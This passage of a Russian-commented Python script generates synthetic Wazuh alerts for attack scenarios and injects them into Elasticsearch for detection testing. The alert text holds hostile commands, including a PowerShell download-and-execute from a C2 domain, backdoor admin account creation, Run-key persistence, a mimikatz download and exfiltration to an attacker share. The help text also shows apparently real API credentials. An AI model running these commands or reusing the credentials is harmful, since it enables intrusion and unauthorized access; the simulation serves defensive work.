        # Rule: 5716 (windows, process), Level: 6 (medium)
        # WINWORD.EXE открывает .docm — документ с макросом VBA
        # ------------------------------------------------------------------
        alerts.append(self._alert(
            aid, aname, aip, 5716, 6,
            "Suspicious Office document macro execution",
            ["windows", "process"], self._ts(base),  # 50 мин назад
            "WINWORD.EXE /embedding C:\\Users\\ivanov\\Downloads\\Invoice_Q4_2024.docm",
            data_extra={"win": {"eventdata": {
                "image": "WINWORD.EXE",
                "commandLine": "WINWORD.EXE /embedding C:\\Users\\ivanov\\Downloads\\Invoice_Q4_2024.docm",
            }}},
        ))

        # ------------------------------------------------------------------
        # Шаг 2: DNS-запрос к C2-домену
        # MITRE: T1071.004 — DNS Application Layer Protocol
        # Rule: 5102 (network, dns), Level: 5 (medium)
        # C2-домен маскируется под Microsoft: "update-service.microsoft-secure.xyz"
        # ------------------------------------------------------------------
        alerts.append(self._alert(
            aid, aname, aip, 5102, 5,
            "DNS query to suspicious domain",
            ["network", "dns"], self._ts(base - 1),  # 49 мин назад
            f"DNS query: {c2_domain}",
            srcip=aip, dstip="8.8.8.8", dstport=53,  # DNS-запрос
            data_extra={"dns": {"query": c2_domain}},  # C2-домен
        ))

        # ------------------------------------------------------------------
        # Шаг 3: PowerShell IEX — скачивание и выполнение beacon с C2
        # MITRE: T1059.001 — PowerShell, T1105 — Ingress Tool Transfer
        # Rule: 5716 (windows, process), Level: 10 (critical)
        # IEX + DownloadString — паттерн скачивания и выполнения в памяти
        # Beacon — имплант C2-фреймворка (Cobalt Strike, Mythic и т.д.)
        # ------------------------------------------------------------------
        alerts.append(self._alert(
            aid, aname, aip, 5716, 10,
            "PowerShell IEX downloading script from external server",
            ["windows", "process"], self._ts(base - 2),  # 48 мин назад
            f"powershell -c \"IEX(New-Object Net.WebClient).DownloadString('http://{c2_domain}/beacon.ps1')\"",
            srcip=aip, dstip=c2_ip,  # Соединение с C2-сервером
            data_extra={"win": {"eventdata": {
                "image": "powershell.exe",
                "commandLine": f"powershell -c IEX(New-Object Net.WebClient).DownloadString('http://{c2_domain}/beacon.ps1')",
            }}},
        ))

        # ------------------------------------------------------------------
        # Шаги 4-8: C2 heartbeat — 5 HTTPS-соединений к C2-серверу
        # MITRE: T1071.001 — Application Layer Protocol: Web Protocols
        #         T1573.001 — Encrypted Channel: Symmetric Cryptography
        # Rule: 5102 (network, firewall), Level: 3 (low)
        # Каждое соединение на 3 минуты раньше предыдущего (i * 3)
        # Порт 443 (HTTPS) — шифрованный C2-канал
        # ------------------------------------------------------------------
        for i in range(5):
            alerts.append(self._alert(
                aid, aname, aip, 5102, 3,
                "Network connection to suspicious external IP",
                ["network", "firewall"], self._ts(base - 5 - i * 3),  # 45, 42, 39, 36, 33 мин назад
                f"Connection from {aip} to {c2_ip}:443 (HTTPS)",
                srcip=aip, dstip=c2_ip, dstport=443,  # HTTPS = порт 443
            ))

        # ------------------------------------------------------------------
        # Шаг 9: Сбор данных — массовый доступ к чувствительным директориям
        # MITRE: T1005 — Data from Local System
        # Rule: 554 (syscheck, syscheck_read), Level: 7 (high)
        # Доступ к Documents и Desktop — подготовка к эксфильтрации
        # ------------------------------------------------------------------
        alerts.append(self._alert(
            aid, aname, aip, 554, 7,
            "Multiple files accessed in sensitive directory",
            ["syscheck", "syscheck_read"], self._ts(base - 20),  # 30 мин назад
            "Files read: C:\\Users\\ivanov\\Documents\\*, C:\\Users\\ivanov\\Desktop\\*.pdf",
            data_extra={"syscheck": {"path": "C:\\Users\\ivanov\\Documents", "event": "read"}},
        ))

        return alerts  # 9 алертов фишинг → C2

    def scenario_privilege_escalation(self, agents: list[dict]) -> list[dict]:
        """
        Сценарий: Повышение привилегий через web-shell (Privilege Escalation).

        Модель атаки:
          Атакующий обнаруживает web-shell на веб-сервере, выполняет команды
          от имени www-data, создаёт backdoor-пользователя, добавляет его
          в группу administrators, устанавливает persistence через реестр,
          и скачивает mimikatz для дампа кредов.

        MITRE ATT&CK техники:
          T1068     — Exploitation for Privilege Escalation
          T1078     — Valid Accounts
          T1053     — Scheduled Task/Job
          T1547.001 — Boot or Logon Autostart Execution: Registry Run Keys
          T1098     — Account Manipulation

        Шаги атаки (5 алертов, base=45 минут назад):
          1. Выполнение команды через web-shell (rule 5716, level 8)
             "cmd /c whoami" от имени www-data — разведка контекста
             Поля: data.win.eventdata.targetUserName="www-data"
          2. Создание backdoor-пользователя (rule 592, level 11)
             "net user backdoor P@ssw0rd! /add" из web-контекста
             Поля: data.win.eventdata.targetUserName="backdoor"
          3. Добавление в administrators (rule 592, level 12)
             "net localgroup administrators backdoor /add"
             Поля: data.win.eventdata.image="net.exe"
          4. Persistence через реестр (rule 554, level 9)
             Run key → svchost_up.exe — автозапуск backdoor
             Поля: data.win.eventdata.targetObject="HKLM\...\Run"
          5. Скачивание mimikatz (rule 5716, level 9)
             Invoke-WebRequest скачивает mimikatz.exe в Temp
             Поля: srcip=<agent_ip>, dstip=10.0.0.50, targetFilename

        Wazuh rule IDs, используемые в сценарии:
          5716 — Подозрительный PowerShell/cmd (группы: web/windows, process)
           592 — Создание пользователя / группы (группы: windows, process)
           554 — Изменение реестра (группы: windows, syscheck)

        Аргументы:
          agents — список агентов Wazuh

        Возвращает:
          list[dict] — 5 алертов, описывающих цепочку повышения привилегий
        """
        a = self._pick_agent(agents)
        aid, aname, aip = a["id"], a["name"], a.get("ip", "192.168.1.100")
        alerts = []
        base = 45  # Первый алерт — 45 минут назад

        # ------------------------------------------------------------------
        # Шаг 1: Выполнение команды через web-shell
        # MITRE: T1068 — Exploitation for Privilege Escalation
        #         T1190 — Exploit Public-Facing Application
        # Rule: 5716 (web, process), Level: 8 (high)
        # "cmd /c whoami" — разведка: определить контекст пользователя (www-data)
        # ------------------------------------------------------------------
        alerts.append(self._alert(
            aid, aname, aip, 5716, 8,
            "Command execution from web service context",
            ["web", "process"], self._ts(base),  # 45 мин назад
            "cmd /c whoami",
            data_extra={"win": {"eventdata": {
                "image": "cmd.exe",
                "commandLine": "cmd /c whoami",
                "targetUserName": "www-data",  # Контекст web-сервера (низкие привилегии)
            }}},
        ))

        # ------------------------------------------------------------------
        # Шаг 2: Создание нового пользователя из web-контекста
        # MITRE: T1136.001 — Create Account: Local Account
        #         T1098 — Account Manipulation
        # Rule: 592 (windows, process), Level: 11 (critical)
        # "net user backdoor /add" — создание backdoor-аккаунта
        # Level 11 — критический, т.к. создание пользователя из web-контекста
        # ------------------------------------------------------------------
        alerts.append(self._alert(
            aid, aname, aip, 592, 11,
            "New user created from web service context",
            ["windows", "process"], self._ts(base - 3),  # 42 мин назад
            "cmd /c net user backdoor P@ssw0rd! /add",
            data_extra={"win": {"eventdata": {
                "image": "cmd.exe",
                "commandLine": "cmd /c net user backdoor P@ssw0rd! /add",
                "targetUserName": "backdoor",  # Имя созданного backdoor-пользователя
            }}},
        ))

        # ------------------------------------------------------------------
        # Шаг 3: Добавление backdoor в группу администраторов
        # MITRE: T1098 — Account Manipulation
        # Rule: 592 (windows, process), Level: 12 (critical)
        # "net localgroup administrators backdoor /add" — повышение привилегий
        # Level 12 — максимальный для этого правила, escalation до admin
        # ------------------------------------------------------------------
        alerts.append(self._alert(
            aid, aname, aip, 592, 12,
            "User added to administrators group",
            ["windows", "process"], self._ts(base - 5),  # 40 мин назад
            "net localgroup administrators backdoor /add",
            data_extra={"win": {"eventdata": {
                "image": "net.exe",
                "commandLine": "net localgroup administrators backdoor /add",
            }}},
        ))

        # ------------------------------------------------------------------
        # Шаг 4: Persistence через Registry Run Key
        # MITRE: T1547.001 — Boot/Logon Autostart: Registry Run Keys
        # Rule: 554 (windows, syscheck), Level: 9 (high)
        # Запись в HKLM\...\Run → svchost_up.exe запустится при загрузке
        # ------------------------------------------------------------------
        alerts.append(self._alert(
            aid, aname, aip, 554, 9,
            "Registry run key modified for persistence",
            ["windows", "syscheck"], self._ts(base - 10),  # 35 мин назад
            "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v WindowsUpdate /t REG_SZ /d C:\\Windows\\Temp\\svchost_up.exe",
            data_extra={"win": {"eventdata": {
                "image": "reg.exe",
                "targetObject": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",  # Run key
                "actionType": "SetValue",  # Установка значения ключа
            }}},
        ))

        # ------------------------------------------------------------------
        # Шаг 5: Скачивание mimikatz — инструмента дампа кредов
        # MITRE: T1003.001 — OS Credential Dumping: LSASS Memory
        #         T1105 — Ingress Tool Transfer
        # Rule: 5716 (windows, process), Level: 9 (high)
        # mimikatz.exe скачивается с 10.0.0.50 в C:\Windows\Temp\m.exe
        # (переименован для обхода простых сигнатур)
        # ------------------------------------------------------------------
        alerts.append(self._alert(
            aid, aname, aip, 5716, 9,
            "PowerShell downloading credential dumping tool",
            ["windows", "process"], self._ts(base - 15),  # 30 мин назад
            "powershell -c Invoke-WebRequest -Uri http://10.0.0.50/mimikatz.exe -OutFile C:\\Windows\\Temp\\m.exe",
            srcip=aip, dstip="10.0.0.50",  # Внешний сервер с инструментами
            data_extra={"win": {"eventdata": {
                "image": "powershell.exe",
                "targetFilename": "C:\\Windows\\Temp\\m.exe",  # Переименованный mimikatz
            }}},
        ))

        return alerts  # 5 алертов повышения привилегий

    def scenario_data_exfiltration(self, agents: list[dict]) -> list[dict]:
        """
        Сценарий: Разведка → архивация → эксфильтрация (Data Exfiltration).

        Модель атаки:
          Атакующий входит через RDP, проводит разведку каталогов
          (ищет конфиденциальные файлы), архивирует найденные данные
          в ZIP-архив, копирует архив на внешний сетевой share,
          и устанавливает сетевое соединение с внешним IP на нестандартном порту.

        MITRE ATT&CK техники:
          T1083     — File and Directory Discovery
          T1005     — Data from Local System
          T1048     — Exfiltration Over Alternative Protocol
          T1041     — Exfiltration Over C2 Channel
          T1071.001 — Application Layer Protocol: Web Protocols

        Шаги атаки (5 алертов, base=40 минут назад):
          1. RDP-вход атакующего (rule 5503, level 5)
             User "hacker" заходит через RDP с 192.168.1.105
             Поля: srcip=192.168.1.105, dstport=3389, data.auth.user="hacker"
          2. Разведка каталогов (rule 5716, level 5)
             "dir /s /b C:\ConfidentialData\*.pdf *.docx" — поиск файлов
             Поля: data.win.eventdata.image="cmd.exe"
          3. Архивация данных (rule 5716, level 7)
             PowerShell Compress-Archive → backup.zip в Temp
             Поля: data.win.eventdata.targetFilename="C:\Windows\Temp\backup.zip"
          4. Копирование архива на внешний share (rule 554, level 10)
             xcopy backup.zip → \\attacker\exfil
             Поля: srcip=192.168.1.105, actionType="FileCopied"
          5. Сетевое соединение с внешним IP (rule 5102, level 8)
             Соединение на 45.33.32.156:8443 (нестандартный порт)
             Поля: srcip=<agent_ip>, dstip=45.33.32.156, dstport=8443

        Wazuh rule IDs, используемые в сценарии:
          5503 — RDP-аутентификация (группа: authentication_success)
          5716 — Подозрительный PowerShell/cmd (группы: windows, process)
           554 — Файловые операции (группы: syscheck)
          5102 — Сетевое соединение (группы: network, firewall)

        Аргументы:
          agents — список агентов Wazuh

        Возвращает:
          list[dict] — 5 алертов, описывающих цепочку эксфильтрации данных
        """
        a = self._pick_agent(agents)
        aid, aname, aip = a["id"], a["name"], a.get("ip", "192.168.1.100")
        attacker = "192.168.1.105"  # IP атакующего
        alerts = []
        base = 40  # Первый алерт — 40 минут назад

        # ------------------------------------------------------------------
        # Шаг 1: RDP-вход атакующего на хост жертвы
        # MITRE: T1021.001 — Remote Desktop Protocol
        # Rule: 5503 (authentication_success), Level: 5 (medium)
        # "hacker" — отличие от lateral_movement, где используется "admin"
        # ------------------------------------------------------------------
        alerts.append(self._alert(
            aid, aname, aip, 5503, 5,
            "Successful RDP login from external IP",
            ["authentication_success"], self._ts(base),  # 40 мин назад
            f"User 'hacker' logged in via RDP from {attacker}",
            srcip=attacker, dstip=aip, dstport=3389,  # RDP = порт 3389
            data_extra={"auth": {"user": "hacker", "type": "RDP"}},
        ))

        # ------------------------------------------------------------------
        # Шаг 2: Разведка — поиск конфиденциальных файлов
        # MITRE: T1083 — File and Directory Discovery
        # Rule: 5716 (windows, process), Level: 5 (medium)
        # "dir /s /b" — рекурсивный листинг .pdf и .docx в ConfidentialData
        # ------------------------------------------------------------------
        alerts.append(self._alert(
            aid, aname, aip, 5716, 5,
            "Directory reconnaissance command",
            ["windows", "process"], self._ts(base - 3),  # 37 мин назад
            "cmd /c dir /s /b C:\\ConfidentialData\\*.pdf C:\\ConfidentialData\\*.docx",
            data_extra={"win": {"eventdata": {
                "image": "cmd.exe",
                "commandLine": "cmd /c dir /s /b C:\\ConfidentialData\\*.pdf C:\\ConfidentialData\\*.docx",
            }}},
        ))

        # ------------------------------------------------------------------
        # Шаг 3: Архивация найденных данных в ZIP
        # MITRE: T1560.001 — Archive Collected Data: Archive via Utilities
        # Rule: 5716 (windows, process), Level: 7 (high)
        # PowerShell Compress-Archive — стандартный инструмент архивации
        # Архив сохраняется в C:\Windows\Temp\backup.zip (скрытное место)
        # ------------------------------------------------------------------
        alerts.append(self._alert(
            aid, aname, aip, 5716, 7,
            "Data archiving with system tool",
            ["windows", "process"], self._ts(base - 8),  # 32 мин назад
            "powershell Compress-Archive -Path C:\\ConfidentialData -DestinationPath C:\\Windows\\Temp\\backup.zip",
            data_extra={"win": {"eventdata": {
                "image": "powershell.exe",
                "commandLine": "powershell Compress-Archive -Path C:\\ConfidentialData -DestinationPath C:\\Windows\\Temp\\backup.zip",
                "targetFilename": "C:\\Windows\\Temp\\backup.zip",  # Путь архива
            }}},
        ))

        # ------------------------------------------------------------------
        # Шаг 4: Копирование архива на внешний сетевой share
        # MITRE: T1048 — Exfiltration Over Alternative Protocol
        #         T1041 — Exfiltration Over C2 Channel
        # Rule: 554 (syscheck), Level: 10 (critical)
        # xcopy backup.zip → \\attacker\exfil — прямая эксфильтрация
        # ------------------------------------------------------------------
        alerts.append(self._alert(
            aid, aname, aip, 554, 10,
            "Mass file copy to external network share",
            ["syscheck"], self._ts(base - 12),  # 28 мин назад
            f"xcopy C:\\Windows\\Temp\\backup.zip \\\\(attacker)\\exfil /Y",
            srcip=attacker,
            data_extra={"win": {"eventdata": {
                "image": "xcopy.exe",
                "targetFilename": "C:\\Windows\\Temp\\backup.zip",  # Что копируется
                "actionType": "FileCopied",
            }}},
        ))

        # ------------------------------------------------------------------
        # Шаг 5: Сетевое соединение с внешним IP на нестандартном порту
        # MITRE: T1071.001 — Application Layer Protocol: Web Protocols
        #         T1571 — Non-Standard Port
        # Rule: 5102 (network, firewall), Level: 8 (high)
        # Порт 8443 — нестандартный HTTPS-порт, вероятно C2-канал
        # ------------------------------------------------------------------
        alerts.append(self._alert(
            aid, aname, aip, 5102, 8,
            "Outbound connection to external IP on non-standard port",
            ["network", "firewall"], self._ts(base - 13),  # 27 мин назад
            f"Connection from {aip} to 45.33.32.156:8443",
            srcip=aip, dstip="45.33.32.156", dstport=8443,  # Нестандартный порт 8443
        ))

        return alerts  # 5 алертов эксфильтрации данных

    # === Основной запуск ===

    def run(self, scenario: str = "all"):
        """
        Основной метод запуска симулятора.

        Выполняет 4 этапа:
          1. Подключение к Wazuh API (аутентификация + получение менеджера)
          2. Получение списка агентов (фильтрация реальных от менеджера)
          3. Генерация алертов по выбранному сценарию
          4. Запись алертов в Elasticsearch (или вывод без записи)

        Аргументы:
          scenario — имя сценария:
            "lateral_movement"    — латеральное движение (10 алертов)
            "phishing_c2"         — фишинг → C2 (9 алертов)
            "privilege_escalation" — повышение привилегий (5 алертов)
            "data_exfiltration"   — эксфильтрация данных (5 алертов)
            "all"                 — все сценарии (29 алертов)

        Вывод в консоль:
          - Шаг 1: Результат аутентификации и имя менеджера
          - Шаг 2: Список агентов (id, name, ip, status)
          - Шаг 3: Количество сгенерированных алертов
          - Шаг 4: Прогресс инъекции (OK/ERR для каждого алерта)
          - Итог: количество записанных алертов и ошибок

        Если --es-url не указан:
          Алерты генерируются, но НЕ записываются в ES.
          Вместо этого выводится таблица алертов в консоль.
        """
        print(f"\n{'='*60}")
        print(f"  Симулятор атак для Wazuh 4.x")
        print(f"  Wazuh: {self.wazuh_url}")
        print(f"  Elasticsearch: {self.es_url or 'НЕ УКАЗАН — алерты НЕ будут записаны!'}")
        print(f"{'='*60}\n")

        # ------------------------------------------------------------------
        # Этап 1: Подключение к Wazuh API
        # Аутентификация через GET + Basic Auth → JWT-токен
        # Также получаем имя менеджера (для поля manager.name в алертах)
        # ------------------------------------------------------------------
        print("[1/4] Подключение к Wazuh API...")
        try:
            self._wazuh_auth()  # GET /security/user/authenticate?raw=true
        except Exception as e:
            print(f"  ОШИБКА аутентификации: {e}")
            sys.exit(1)  # Критическая ошибка — нельзя продолжать без токена
        print("  OK — токен получен")

        try:
            self.get_manager_info()  # GET /?pretty=true → hostname
            print(f"  Менеджер: {self.manager_name}")
        except Exception as e:
            print(f"  Предупреждение: не удалось получить инфо менеджера: {e}")
            # Некритично — используем значение по умолчанию "wazuh.manager"

        # ------------------------------------------------------------------
        # Этап 2: Получение списка агентов
        # Нужны для заполнения полей agent.id, agent.name, agent.ip в алертах
        # Агент с id="000" — это сам менеджер, его обычно не используем
        # ------------------------------------------------------------------
        print("\n[2/4] Получение списка агентов...")
        try:
            agents = self.get_existing_agents()  # GET /agents?select=id,name,ip,...
        except Exception as e:
            print(f"  ОШИБКА: {e}")
            sys.exit(1)  # Критическая ошибка — без агентов не генерировать алерты

        real_agents = [a for a in agents if a.get("id") != "000"]  # Фильтруем менеджера
        print(f"  Всего агентов: {len(agents)} (реальных: {len(real_agents)})")
        for a in agents:
            icon = "*" if a.get("id") != "000" else " "  # * = реальный, пробел = менеджер
            print(f"   {icon} [{a.get('id')}] {a.get('name')} ({a.get('ip', '?')}) — {a.get('status', '?')}")

        # ------------------------------------------------------------------
        # Этап 3: Генерация алертов по выбранному сценарию
        # Вызывает соответствующий метод scenario_*() или все 4 метода
        # ------------------------------------------------------------------
        print(f"\n[3/4] Генерация алертов (сценарий: {scenario})...")
        all_alerts = self._collect(scenario, agents)  # Собираем алерты из сценария(ев)
        print(f"  Сгенерировано алертов: {len(all_alerts)}")

        # ------------------------------------------------------------------
        # Если ES URL не указан — выводим алерты без записи
        # Это полезно для проверки генерации без реального ES
        # ------------------------------------------------------------------
        if not self.es_url:
            print("\n  --- АЛЕРТЫ НЕ ЗАПИСАНЫ (нет --es-url) ---")
            print("  Для записи добавьте:")
            print(f"    --es-url https://31.77.202.176:9200 --es-user admin --es-pass SecretPassword")
            print("\n  Сгенерированные алерты:")
            for i, al in enumerate(all_alerts, 1):
                r = al.get("rule", {})
                ag = al.get("agent", {})
                ts = al.get("@timestamp", "")[:19]
                print(f"   {i:3d}. [{ts}] {ag.get('name','?'):10s} | L{r.get('level',0):2d} | {r.get('description','')}")
            return  # Выход без инъекции

        # ------------------------------------------------------------------
        # Этап 4: Запись алертов в Elasticsearch
        # PUT /wazuh-alerts-4.x-YYYY.MM.DD/_doc/<id>
        # Между запросами пауза 0.05 с для снижения нагрузки на ES
        # ------------------------------------------------------------------
        print(f"\n[4/4] Запись в Elasticsearch ({self.es_url})...")
        ok, err = 0, 0  # Счётчики успешных и ошибочных инъекций
        for i, al in enumerate(all_alerts, 1):
            try:
                self.inject_alert(al)  # PUT-запрос в ES
                r = al.get("rule", {})
                ag = al.get("agent", {})
                print(f"   {i:3d}/{len(all_alerts)} OK {ag.get('name','?'):10s} | L{r.get('level',0):2d} | {r.get('description','')[:55]}")
                ok += 1
            except Exception as e:
                print(f"   {i:3d}/{len(all_alerts)} ERR {str(e)[:70]}")
                err += 1
            time.sleep(0.05)  # Пауза 50 мс между запросами

        # ------------------------------------------------------------------
        # Итоговый отчёт
        # После записи нужно подождать 1-2 минуты для индексации ES
        # (ES обновает индекс асинхронно, поиск может не сразу находить новые документы)
        # ------------------------------------------------------------------
        print(f"\n{'='*60}")
        print(f"  ГОТОВО! Записано: {ok}, Ошибок: {err}")
        print(f"  Подождите 1-2 минуты для индексации.")  # ES refresh interval ~1s, но Wazuh может кэшировать
        print(f"  Затем обновите страницу приложения.")
        print(f"{'='*60}\n")

    def _collect(self, scenario: str, agents: list[dict]) -> list[dict]:
        """
        Собрать алерты из одного или всех сценариев.

        Аргументы:
          scenario — имя сценария или "all"
          agents   — список агентов Wazuh

        Возвращает:
          list[dict] — все сгенерированные алерты

        Маппинг сценариев:
          "lateral_movement"     → scenario_lateral_movement()   → 10 алертов
          "phishing_c2"          → scenario_phishing_c2()        → 9 алертов
          "privilege_escalation" → scenario_privilege_escalation() → 5 алертов
          "data_exfiltration"    → scenario_data_exfiltration()  → 5 алертов
          "all"                  → все 4 сценария                 → 29 алертов

        Если указан неизвестный сценарий — выводит справку и завершает работу.
        """
        scenarios_map = {
            "lateral_movement": self.scenario_lateral_movement,
            "phishing_c2": self.scenario_phishing_c2,
            "privilege_escalation": self.scenario_privilege_escalation,
            "data_exfiltration": self.scenario_data_exfiltration,
        }
        if scenario == "all":
            # Запускаем все сценарии последовательно
            result = []
            for name, fn in scenarios_map.items():
                print(f"  --- {name} ---")
                result.extend(fn(agents))  # Добавляем алерты каждого сценария
            return result
        elif scenario in scenarios_map:
            # Запускаем только выбранный сценарий
            return scenarios_map[scenario](agents)
        else:
            # Неизвестный сценарий — ошибка
            print(f"  Неизвестный сценарий: {scenario}")
            print(f"  Доступные: {', '.join(scenarios_map.keys())}, all")
            sys.exit(1)


def main():
    """
    Точка входа — разбор аргументов командной строки и запуск симулятора.

    Аргументы командной строки:
      --url           — Wazuh API URL (обязательный)
                        Формат: https://<host>:55000
                        Пример: https://31.77.202.176:55000

      --user          — Логин Wazuh API (обязательный)
                        Обычно "wazuh-wui" (Wazuh API user)

      --pass          — Пароль Wazuh API (обязательный)
                        Пример: 'MyS3cr37P450r.*-'

      --es-url        — URL Elasticsearch (опциональный)
                        Формат: https://<host>:9200
                        Если не указан — алерты генерируются, но НЕ записываются
                        Пример: https://31.77.202.176:9200

      --es-user       — Логин Elasticsearch (опциональный)
                        Обычно "admin" (OpenSearch Indexer default)

      --es-pass       — Пароль Elasticsearch (опциональный)

      --scenario      — Сценарий атаки (default: lateral_movement)
                        Варианты:
                          lateral_movement    — RDP + PowerShell (10 алертов)
                          phishing_c2         — Фишинг → C2 (9 алертов)
                          privilege_escalation — Web-shell → admin (5 алертов)
                          data_exfiltration   — Разведка → эксфильтрация (5 алертов)
                          all                 — Все сценарии (29 алертов)

      --no-verify-ssl — Отключить проверку SSL-сертификатов
                        Необходимо для self-signed сертификатов Wazuh/ES

    Пример полного запуска:
      python simulate_attack.py \
        --url https://31.77.202.176:55000 \
        --user wazuh-wui --pass 'MyS3cr37P450r.*-' \
        --es-url https://31.77.202.176:9200 \
        --es-user admin --es-pass SecretPassword \
        --no-verify-ssl \
        --scenario all

    Процесс выполнения:
      1. Создание AttackSimulator с переданными кредами
      2. Аутентификация в Wazuh API
      3. Получение списка агентов
      4. Генерация алертов по сценарию
      5. Инъекция алертов в Elasticsearch
    """
    parser = argparse.ArgumentParser(
        description="Симулятор атак — генерирует алерты в Wazuh через Elasticsearch",
        formatter_class=argparse.RawDescriptionHelpFormatter,  # Сохраняет форматирование epilog
        epilog="""
Пример для вашего Wazuh:

  python simulate_attack.py \\
    --url https://31.77.202.176:55000 \\
    --user wazuh-wui --pass 'MyS3cr37P450r.*-' \\
    --es-url https://31.77.202.176:9200 \\
    --es-user admin --es-pass SecretPassword \\
    --no-verify-ssl \\
    --scenario all
""")
    # --- Обязательные аргументы Wazuh API ---
    parser.add_argument("--url", required=True,
                        help="Wazuh API URL (напр. https://31.77.202.176:55000)")
    parser.add_argument("--user", required=True,
                        help="Wazuh API пользователь (напр. wazuh-wui)")
    parser.add_argument("--pass", dest="password", required=True,
                        help="Wazuh API пароль")
    # --- Опциональные аргументы Elasticsearch ---
    parser.add_argument("--es-url", default="",
                        help="Elasticsearch URL для записи алертов (напр. https://31.77.202.176:9200)")
    parser.add_argument("--es-user", default="",
                        help="Elasticsearch пользователь (напр. admin)")
    parser.add_argument("--es-pass", dest="es_password", default="",
                        help="Elasticsearch пароль")
    # --- Сценарий и SSL ---
    parser.add_argument("--scenario", default="lateral_movement",
                        choices=["lateral_movement", "phishing_c2",
                                 "privilege_escalation", "data_exfiltration", "all"],
                        help="Сценарий атаки (default: lateral_movement)")
    parser.add_argument("--no-verify-ssl", action="store_true",
                        help="Отключить проверку SSL-сертификатов (для self-signed)")

    args = parser.parse_args()

    # Создаём экземпляр симулятора с переданными параметрами
    sim = AttackSimulator(
        wazuh_url=args.url,
        wazuh_user=args.user,
        wazuh_pass=args.password,
        es_url=args.es_url,
        es_user=args.es_user,
        es_pass=args.es_password,
        verify_ssl=not args.no_verify_ssl,  # Инверсия: --no-verify-ssl → verify_ssl=False
    )
    # Запуск основного процесса (4 этапа: auth → agents → generate → inject)
    sim.run(args.scenario)


if __name__ == "__main__":
    main()
